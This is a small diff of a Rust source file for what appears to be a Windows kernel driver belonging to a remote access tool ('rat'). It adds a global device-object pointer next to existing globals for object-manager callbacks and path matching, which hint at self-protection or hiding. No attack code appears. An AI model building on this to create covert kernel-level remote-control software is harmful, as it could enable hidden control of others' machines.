@@ -5,7 +5,7 @@ use core::sync::atomic::{AtomicBool, AtomicPtr};
 use aho_corasick::AhoCorasick;
 use const_format::formatcp;
 use rat_common::windows::RAT_CLIENT_SERVICE_NAME;
-use wdk_sys::DRIVER_OBJECT;
+use wdk_sys::{DEVICE_OBJECT, DRIVER_OBJECT};
 use widestring::{U16CStr, u16cstr};
 
 pub const MAX_INITIALIZE_ATTEMPTS: usize = 50;
@@ -44,3 +44,4 @@ pub static OBJ_PATH_AHO_CORASICK: AtomicPtr<AhoCorasick> = AtomicPtr::new(ptr::n
 pub static OB_REGISTER_CALLBACKS_HANDLE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
 
 pub static ORIGINAL_DRIVER_OBJECT: AtomicPtr<DRIVER_OBJECT> = AtomicPtr::new(ptr::null_mut());
+pub static RAT_DEVICE_OBJECT: AtomicPtr<DEVICE_OBJECT> = AtomicPtr::new(ptr::null_mut());
